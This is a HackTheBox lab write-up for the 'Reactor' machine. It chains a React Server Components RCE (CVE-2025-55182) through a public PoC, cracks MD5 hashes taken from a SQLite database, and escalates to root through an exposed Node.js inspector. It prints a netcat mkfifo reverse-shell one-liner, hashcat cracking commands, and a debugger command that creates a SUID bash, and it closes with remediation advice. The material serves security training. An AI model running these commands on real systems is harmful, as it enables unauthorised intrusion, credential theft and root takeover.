# HackTheBox — Reactor Writeup

> **Difficulty:** Medium  
> **OS:** Linux    
> **Author:** ak4hit  

---

## Summary

Reactor is a Medium-difficulty Linux machine centered around a Next.js web application. The attack chain involves exploiting **CVE-2025-55182**, a prototype pollution vulnerability in React Server Components leading to Remote Code Execution, followed by credential extraction from a SQLite database, and privilege escalation via an exposed Node.js debugger (`--inspect`) running as root.

---

## Reconnaissance

### Nmap

```bash
nmap -A 10.129.x.x
```

**Open Ports:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 9.6p1 Ubuntu |
| 3000 | HTTP    | Next.js 15.0.3 |

Port 3000 hosts a Next.js application — confirmed by the `X-Powered-By: Next.js` response header.

---

## Enumeration

### Web Application — Port 3000

Visiting `http://10.129.x.x:3000` reveals **ReactorWatch**, a nuclear reactor core monitoring dashboard.

**Key observations:**
- Built with Next.js 15.0.3 (App Router, React Server Components enabled)
- Static dashboard with no visible login or interactive features
- Technology fingerprinting confirms: Next.js 15.0.3, React, Tailwind CSS

---

## Foothold — CVE-2025-55182 (React Server RCE)

### Vulnerability

**CVE-2025-55182** is a prototype pollution vulnerability in React Server Components (versions 19.0.0–19.2.0). The flight data deserializer used by Next.js App Router improperly handles `__proto__` chains in multipart form data submitted via the `Next-Action` header. This allows an attacker to control the `_response._prefix` field, which gets evaluated server-side in a Node.js context — resulting in unauthenticated Remote Code Execution.

**References:**
- https://nvd.nist.gov/vuln/detail/CVE-2025-55182
- https://www.exploit-db.com/exploits/52506

### Exploitation

A public PoC is available at:  
`https://gist.githubusercontent.com/byt3n33dl3/be855564f3fb24303d74f4380519a0d1/raw/.../CVE-2025-55182.py`

**Step 1 — Verify RCE:**

```bash
python3 CVE-2025-55182.py -t http://10.129.x.x:3000/ -c "id"
```

```
[+] SUCCESS!
uid=999(node) gid=988(node) groups=988(node)
```

**Step 2 — Reverse shell:**

```bash
# Terminal 1
nc -lvnp 4444

# Terminal 2
python3 CVE-2025-55182.py -t http://10.129.x.x:3000/ \
  -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.x 4444 >/tmp/f"
```

**Step 3 — Stabilize shell:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

Shell obtained as `node` in `/opt/reactor-app`.

---

## Lateral Movement — node → engineer

### SQLite Credential Extraction

The application directory contains a SQLite database:

```bash
ls /opt/reactor-app
# app  next.config.js  node_modules  package.json  reactor.db

sqlite3 /opt/reactor-app/reactor.db "SELECT username, password_hash, role FROM users;"
```

```
admin|a203b22191d744a4e70ada5c101b17b8|administrator
engineer|39d97110eafe2a9a68639812cd271e8e|operator
```

Both hashes are MD5. Cracking with rockyou:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

```
engineer:reactor1
```

### Switch User

```bash
su engineer
# Password: reactor1

cat /home/engineer/user.txt
```

**User flag:** `********************************`

---

## Privilege Escalation — engineer → root

### Enumeration

Checking running processes reveals a critical misconfiguration:

```bash
ps aux | grep node
```

```
root  1412  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Root is running a Node.js process with the V8 debugger exposed on `127.0.0.1:9229`. While bound to loopback, this is accessible via SSH port forwarding.

### Exploitation — Node Inspector RCE as Root

**Step 1 — Forward the debugger port:**

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.x.x
```

**Step 2 — Connect to the debugger:**

```bash
node inspect 127.0.0.1:9229
```

**Step 3 — Verify execution context:**

```
debug> exec("process.getuid()")
# Returns: 0  ← running as root
```

**Step 4 — Create SUID bash:**

```
debug> exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t')")
```

**Step 5 — Execute as root:**

```bash
/tmp/r00t -p
cat /root/root.txt
```

**Root flag:** `*******************************`

---

## Vulnerability Summary

| # | Vulnerability | Impact |
|---|--------------|--------|
| 1 | CVE-2025-55182 — React RSC Prototype Pollution | Unauthenticated RCE |
| 2 | Plaintext-equivalent credentials in SQLite | Lateral movement |
| 3 | Node.js `--inspect` running as root | Full privilege escalation |

---

## Remediation

- **CVE-2025-55182:** Upgrade React to ≥19.2.1 and Next.js to a patched release
- **Credentials:** Don't store MD5-hashed passwords; use bcrypt/argon2 with salts; don't ship credentials in app databases
- **Node Inspector:** Never run `--inspect` in production; if required for debugging, use a dedicated non-root user and restrict access beyond loopback

---

## Tools Used

- `nmap` — port scanning
- `CVE-2025-55182.py` — PoC exploit
- `sqlite3` — database extraction
- `hashcat` — hash cracking
- `node inspect` — V8 debugger client
- `nc` — reverse shell listener

---


